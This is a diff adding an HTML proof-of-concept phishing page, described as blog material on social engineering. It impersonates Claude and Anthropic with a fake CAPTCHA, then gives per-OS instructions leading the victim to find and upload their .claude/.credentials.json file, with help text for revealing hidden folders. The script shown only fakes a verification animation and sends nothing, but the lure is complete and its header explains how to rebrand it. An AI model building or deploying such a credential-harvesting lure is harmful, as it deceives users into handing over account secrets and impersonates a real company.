@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<!--
+  POC: Fake "human verification" CAPTCHA that pivots to a file-upload step.
+  For blog / educational use illustrating the social-engineering pattern.
+  Path shown (~/.claude/.credentials.json) is a benign placeholder.
+
+  100% client-side. The selected file is NEVER read, stored, or transmitted.
+  It only drives the fake "verifying" animation.
+
+  Branding: swap the brand name in .brand / .footer and the shield <svg>
+  fill to drop in a real logo.
+-->
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify you are human</title>
+<style>
+  :root {
+    --bg:          #FFFFFF;
+    --surface:     #FFFFFF;
+    --panel:       #E8E0D8;
+    --ink:         #191919;
+    --accent:      #D4A27F;
+    --accent-strong:#C08F68;
+    --muted:       #7C7168;
+    --line:        #E4DACF;
+    --line-strong: #CBBBA9;
+    --code-fg:     #E8E0D8;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background:
+      radial-gradient(900px 500px at 50% -10%, var(--panel) 0%, transparent 62%),
+      var(--bg);
+    font-family: "Anthropic Serif", serif;
+    color: var(--ink);
+  }
+  .widget {
+    width: 380px;
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 24px;
+    box-shadow: 0 18px 50px rgba(25,25,25,.12);
+    padding: 26px;
+  }
+  .brand {
+    display: flex; align-items: center; gap: 9px;
+    font-size: 13px; font-weight: 600; color: var(--muted);
+    margin-bottom: 20px; letter-spacing: .2px;
+  }
+  .brand-logo {
+    width: 22px; height: 22px; flex: 0 0 auto;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 6px; overflow: hidden;
+  }
+  .brand-logo img,
+  .brand-logo svg { width: 100%; height: 100%; object-fit: contain; }
+  .prompt { font-size: 17px; font-weight: 600; margin: 0 0 6px; color: var(--ink); }
+  .sub { font-size: 13px; color: var(--muted); margin: 0 0 14px; line-height: 1.5; }
+  
+
+
+  /* guidance sections */
+  .guidance {
+    background: var(--panel);
+    border-radius: 12px;
+    padding: 12px 14px;
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.6;
+    margin-bottom: 14px;
+  }
+  .guidance strong { color: var(--ink); display: block; margin-bottom: 8px; }
+  .guidance ol { margin: 6px 0 0; padding-left: 18px; }
+  .guidance li { margin-bottom: 6px; }
+
+  /* expandable help */
+  .expand-help {
+    font-size: 11px;
+    color: var(--accent-strong);
+    cursor: pointer;
+    text-decoration: none;
+    margin-top: 8px;
+    display: inline-block;
+  }
+  .expand-help:hover { text-decoration: underline; }
+  .help-detail {
+    margin-top: 10px;
+    padding: 10px;
+    background: rgba(212,162,127,0.08);
+    border-left: 2px solid var(--accent);
+    border-radius: 8px;
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.5;
+    display: none;
+  }
+  .help-detail.show { display: block; }
+
+  /* checkbox gate */
+  .gate {
+    display: flex; align-items: center; gap: 12px;
+    border: 1px solid var(--line);
+    background: var(--panel);
+    border-radius: 16px;
+    padding: 15px 16px;
+    cursor: pointer;
+    transition: border-color .15s, background .15s;
+  }
+  .gate:hover { border-color: var(--accent); }
+  .box {
+    width: 24px; height: 24px; border-radius: 8px;
+    border: 2px solid var(--line-strong); background: transparent;
+    flex: 0 0 auto; position: relative; transition: all .2s;
+  }
+  .gate.checked .box { background: var(--accent); border-color: var(--accent); }
+  .gate.checked .box::after {
+    content: "\2713"; color: #fff; font-size: 15px;
+    position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
+  }
+  .gate-label { font-size: 14px; font-weight: 500; color: var(--ink); }
+
+  /* upload step */
+  .step { margin-top: 4px; }
+  .dropzone {
+    display: block;
+    border: 1.6px dashed var(--line-strong);
+    border-radius: 18px;
+    padding: 26px 12px;
+    text-align: center;
+    cursor: pointer;
+    transition: border-color .15s, background .15s;
+  }
+  .dropzone:hover { border-color: var(--accent); background: rgba(212,162,127,.08); }
+  .dropzone.drag { border-color: var(--accent); background: rgba(212,162,127,.14); }
+  .dz-icon { color: var(--accent); margin-bottom: 10px; }
+  .dz-text { font-size: 14px; font-weight: 600; color: var(--ink); }
+  .dz-hint { font-size: 12px; color: var(--muted); margin-top: 4px; }
+  input[type=file] { display: none; }
+
+  .state { display: flex; align-items: center; gap: 11px; padding: 14px 4px; font-size: 14px; }
+  .spinner {
+    width: 20px; height: 20px; border-radius: 50%;
+    border: 2.5px solid var(--panel); border-top-color: var(--accent);
+    animation: spin .7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .check {
+    width: 22px; height: 22px; border-radius: 50%;
+    background: var(--accent); color: #fff;
+    display: flex; align-items: center; justify-content: center; font-size: 13px;
+  }
+  .fname { color: var(--muted); font-size: 12.5px; }
+
+  .footer {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-top: 20px; padding-top: 14px; border-top: 1px solid var(--line);
+    font-size: 11px; color: var(--muted);
+  }
+  .footer a { color: var(--muted); text-decoration: none; }
+  .footer a:hover { color: var(--accent-strong); }
+  .hidden { display: none; }
+</style>
+</head>
+<body>
+
+<div class="widget" id="widget">
+  <div class="brand">
+    <div class="brand-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Claude_AI_symbol.svg/1280px-Claude_AI_symbol.svg.png" alt="Claude">
+    </div>
+  </div>
+
+  <!-- Step 1: checkbox gate -->
+  <div id="step-gate">
+    <p class="prompt">Verify you are human</p>
+    <p class="sub">Complete the check below to continue to the site.</p>
+    <div class="gate" id="gate">
+      <div class="box"></div>
+      <div class="gate-label">I'm not a robot</div>
+    </div>
+  </div>
+
+  <!-- Step 2: upload lure -->
+  <div id="step-prompt" class="step hidden">
+    <p class="prompt">Claude Additional verification required</p>
+    <p class="sub">Verify your Claude account by following the below instructions:</p>
+    
+    <div class="guidance">
+      <strong id="guidanceTitle">macOS</strong>
+      <ol id="guidanceSteps">
+        <!-- Steps populated by JS -->
+      </ol>
+    </div>
+
+    <a class="expand-help" id="expandHelp" href="#">Need help? Show me step-by-step</a>
+    <div class="help-detail" id="helpDetail"></div>
+    
+    <label class="dropzone" id="dropzone" for="fileInput">
+      <div class="dz-icon">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 16V4"/><path d="M6 10l6-6 6 6"/><path d="M4 20h16"/>
+        </svg>
+      </div>
+      <span class="dz-text">Click to browse</span> <br>
+      <span class="dz-hint" id="dzHint"></span>
+    </label>
+    
+    <input type="file" id="fileInput" hidden>
+  </div>
+
+  <!-- Step 3: fake verifying -->
+  <div id="step-verify" class="hidden">
+    <div class="state">
+      <div class="spinner"></div>
+      <div>Verifying<span class="fname" id="verifyName"></span></div>
+    </div>
+  </div>
+
+  <!-- Step 4: fake success -->
+  <div id="step-done" class="hidden">
+    <div class="state">
+      <div class="check">&#10003;</div>
+      <div>Verification complete</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <span>Claude by Anthropic</span>
+    <span><a href="#">Privacy</a> &nbsp;&middot;&nbsp; <a href="#">Terms</a></span>
+  </div>
+</div>
+
+<script>
+  // OS detection and guidance/command generation
+  (function () {
+    const p = navigator.userAgentData?.platform || navigator.platform || '';
+    const ua = navigator.userAgent;
+    
+    const guidanceTitle = document.getElementById('guidanceTitle');
+    const guidanceSteps = document.getElementById('guidanceSteps');
+    const helpDetail = document.getElementById('helpDetail');
+    const expandHelp = document.getElementById('expandHelp');
+    
+    let osType = 'unknown';
+    let cmd = '~/.test/.test.json';
+    let steps = [];
+    let help = '';
+    let hint = '';
+
+    if (/CrOS/.test(ua)) {
+      osType = 'Chromebook';
+      steps = [
+        'Open the Files app from your Chromebook',
+        'In the left sidebar, look for "Linux files" or "Files" under the home section',
+        'Click the magnify glass and enter: <code style="background: var(--ink); color: var(--code-fg); padding: 2px 4px; border-radius: 4px; font-size: 11px;">credentials</code>',
+        'Select and open .credentials.json'
+      ];
+      help = '<strong>If you don\'t see "Linux files":</strong> Linux file support may not be enabled on your Chromebook. Ask your administrator or contact support — this file requires Linux file access.';
+    } else if (/Mac/i.test(p)) {
+      osType = 'macOS';
+      steps = [
+        'Open Finder',
+        'Press Command+Shift+G to open the "Go to the folder" dialog',
+        'Paste this path: <code style="background: var(--ink); color: var(--code-fg); padding: 2px 4px; border-radius: 4px; font-size: 11px;">~/.claude/.credentials.json</code>',
+        'Press Return and select .credentials.json',
+        'Click Open'
+      ];
+      help = '<strong>What if I don\'t see the file?</strong> Hidden folders (starting with a dot) may not be visible. If the folder doesn\'t appear after typing the path, your file may not exist at that location yet — double-check the path with the person who sent you this link.';
+    } else if (/Win/i.test(p)) {
+      osType = 'Windows';
+      steps = [
+        'Open File Explorer',
+        'Click the address bar at the top (where it shows your current folder path)',
+        'Paste this path: <code style="background: var(--ink); color: var(--code-fg); padding: 2px 4px; border-radius: 4px; font-size: 11px;">%USERPROFILE%\\.claude\\.credentials.json</code>',
+        'Press Enter and select .credentials.json',
+        'Click Open'
+      ];
+      help = '<strong>What if I can\'t find the address bar?</strong> Look for the folder icon and path at the very top of File Explorer. If you see only folder names (not a text path), press Ctrl+L to switch to text mode. <strong>What if the folder doesn\'t exist?</strong> The folder may be hidden — in File Explorer\'s View menu, check "Hidden items" to show hidden folders.';
+    } else if (/Linux/i.test(p)) {
+      osType = 'Linux';
+      steps = [
+        'Open your file manager',
+        'Press Ctrl+L to show the location bar',
+        'Paste this path: <code style="background: var(--ink); color: var(--code-fg); padding: 2px 4px; border-radius: 4px; font-size: 11px;">~/.claude/.credentials.json</code>',
+        'Press Enter and select .credentials.json',
+        'Click Open'
+      ];
+      help = '<strong>What if pressing Ctrl+L doesn\'t work?</strong> Different file managers use different shortcuts. Look for an "Edit" or "Tools" menu and find "Type Location" or "Go to Path." <strong>What if the folder doesn\'t exist?</strong> Verify the path is correct — hidden folders start with a dot (.) and may need to be shown in your file manager\'s View settings.';
+    } else {
+      osType = 'Your computer';
+      steps = [
+        'Open your file browser',
+        'Navigate to your home folder',
+        'Look for the path: <code style="background: var(--ink); color: var(--code-fg); padding: 2px 4px; border-radius: 4px; font-size: 11px;">~/.claude/.credentials.json</code>',
+        'Select the file .credentials.json',
+        'Click Open'
+      ];
+      help = '<strong>Hidden folders:</strong> Folders starting with a dot (.) are hidden on most systems. Check your file manager\'s View menu to "Show hidden files."';
+    }
+
+    // Update UI elements
+    guidanceTitle.textContent = osType;
+    
+    // Populate numbered steps
+    guidanceSteps.innerHTML = steps.map(step => `<li>${step}</li>`).join('');
+    
+    helpDetail.innerHTML = help;
+
+    // Expandable help
+    expandHelp.addEventListener('click', (e) => {
+      e.preventDefault();
+      helpDetail.classList.toggle('show');
+      expandHelp.textContent = helpDetail.classList.contains('show')
+        ? 'Hide step-by-step'
+        : 'Need help? Show me step-by-step';
+    });
+  })();
+
+  // Main logic: gate, file handling, and animation flow
+  const gate    = document.getElementById('gate');
+  const input   = document.getElementById('fileInput');
+  const dz      = document.getElementById('dropzone');
+  const sGate   = document.getElementById('step-gate');
+  const sPrompt = document.getElementById('step-prompt');
+  const sVerify = document.getElementById('step-verify');
+  const sDone   = document.getElementById('step-done');
+  const vName   = document.getElementById('verifyName');
+
+  // Checkbox gate click
+  gate.addEventListener('click', () => {
+    gate.classList.add('checked');
+    setTimeout(() => {
+      sGate.classList.add('hidden');
+      sPrompt.classList.remove('hidden');
+    }, 500);
+  });
+
+  // File selection handler
+  function handleFile(file) {
+    if (!file) return;
+    vName.textContent = ' ' + file.name;
+    sPrompt.classList.add('hidden');
+    sVerify.classList.remove('hidden');
+    setTimeout(() => {
+      sVerify.classList.add('hidden');
+      sDone.classList.remove('hidden');
+    }, 2200);
+  }
+
+  // File input change event
+  input.addEventListener('change', e => handleFile(e.target.files[0]));
+
+  // Drag and drop handling
+  ['dragover', 'dragenter'].forEach(ev =>
+    dz.addEventListener(ev, e => {
+      e.preventDefault();
+      dz.classList.add('drag');
+    })
+  );
+
+  ['dragleave', 'drop'].forEach(ev =>
+    dz.addEventListener(ev, e => {
+      e.preventDefault();
+      dz.classList.remove('drag');
+    })
+  );
+
+  dz.addEventListener('drop', e => handleFile(e.dataTransfer.files[0]));
+</script>
+
+</body>
+</html>
